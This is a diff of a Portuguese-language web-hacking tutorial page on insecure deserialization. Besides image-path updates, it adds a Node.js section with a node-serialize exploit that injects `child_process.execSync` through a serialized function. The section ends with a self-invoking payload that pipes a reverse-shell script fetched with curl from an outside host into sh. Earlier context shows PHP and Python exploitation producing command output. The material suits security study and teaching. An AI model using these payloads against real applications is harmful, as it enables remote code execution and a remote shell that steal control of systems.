@@ -9,7 +9,7 @@
 
 Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
 
-object-1-image.jpg
+<figure><img src="../assets/web_hacking/insecure_deserialization/insecure-object.jpg" alt=""><figcaption></figcaption></figure>
 
 Essa forma de compactação pode ser em dois tipos: binário ou human-readable. Os Binários são: Java serialization, python pickle, C++ Object Representationm, etc. Os Human-Readable são: JSON, XML, YAML, SOAP, PHP Serialization, etc.
 
@@ -53,11 +53,11 @@ TYPE:QTY:VALUE
 
 Nos exemplos a seguir, podemos ver que é possível explorar a insecure deserialization por causa do magic method `__destruct()`&#x20;
 
-<figure><img src="../.gitbook/assets/php-1.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/insecure_deserialization/id-php-1.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/php-2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/insecure_deserialization/id-php-2.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/php-3.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/insecure_deserialization/id-php-3.png" alt=""><figcaption></figcaption></figure>
 
 Com isso, podemos montar um array com um objeto serializado da classe FileManager, explorando the magic method `__destruct()` do PHP.
 
@@ -159,3 +159,75 @@ $ python3 exploity-id.py
 
 uid=1000(nizyuu) gid=1000(nizyuu) groups=1000(nizyuu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
 ```
+
+## Node
+
+Vamos ver como o node serializa um objeto
+
+```javascript 
+const nodeserialize = require('node-serialize');
+
+const user = {
+    name: "myName",
+    email: "my-email@gmai.com",
+    getName: function(){
+        console.log('test');
+    }
+};
+
+serializedObject = nodeserialize.serialize(user);
+
+console.log(serializedObject + "\n");
+
+obj = nodeserialize.unserialize(serializedObject);
+
+console.log(obj);
+```
+
+O resultado
+
+```
+$ node index.js
+
+{"name":"myName","email":"my-email@gmai.com","getName":"_$$ND_FUNC$$_function(){\n        console.log('test');\n    }"}
+
+{
+  name: 'myName',
+  email: 'my-email@gmai.com',
+  getName: [Function (anonymous)]
+}
+
+```
+
+Com isso, podemos montar um exploit como esse
+
+```javascript
+cat insecure_deserialization_exploit.js 
+const nodeserialize = require('node-serialize');
+
+const user = {"role":"administrator"}
+user.username = function(){require("child_process").execSync("sleep 10")}
+
+serializedObject = nodeserialize.serialize(user)
+
+console.log(serializedObject)
+```
+
+Podemos ver o resultado do script
+
+{% code overflow="wrap" fullWidth="false" %}
+```
+node exploit.js
+ 
+{"role":"administrator","username":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"sleep 10\")}"}
+```
+{% endcode %}
+
+Lembrando que precisamos colocar `()` no final da funcao para ela ser executada automaticamente ao ser chamada.
+
+{% code overflow="wrap" fullWidth="false" %}
+```
+{"role":"administrator","username":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"curl https://reverse-shell.sh/192.168.1.104:1337 | sh\")}()"}
+```
+{% endcode %}
+
